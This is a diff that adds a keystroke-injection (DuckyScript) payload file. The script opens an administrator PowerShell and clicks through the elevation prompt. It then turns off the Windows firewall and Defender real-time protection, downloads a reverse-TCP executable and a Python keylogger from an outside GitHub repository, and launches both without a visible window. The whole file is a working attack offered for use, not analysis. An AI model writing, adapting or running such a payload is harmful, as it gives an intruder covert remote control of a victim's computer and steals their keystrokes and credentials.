@@ -1,0 +1,31 @@
+DELAY 5000
+GUI r
+DELAY 1000
+STRING powershell -ExecutionPolicy Unrestricted Start-Process powershell -Verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+ENTER
+DELAY 1000
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+ENTER
+DELAY 1000
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+ENTER
+DELAY 1000
+STRING (New-Object Net.WebClient).DownloadFile('https://github.com/bentoro/payloads/blob/master/windows_reverse_tcp.exe?raw=true', 'C:\Users\Administrator\Downloads\windowsreverse.exe')
+ENTER
+DELAY 3000
+STRING (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/bentoro/payloads/master/windows_keylogger.py', 'C:\Users\Administrator\Downloads\windows_keylogger.py')
+ENTER
+DELAY 3000
+STRING Start-Process -NoNewWindow C:\Users\Administrator\Downloads\windowsreverse.exe
+ENTER
+DELAY 1000
+STRING Start-Process -NoNewWindow py.exe C:\Users\Administrator\Downloads\windows_keylogger.py
+ENTER
+DELAY 1000
+STRING exit
+ENTER
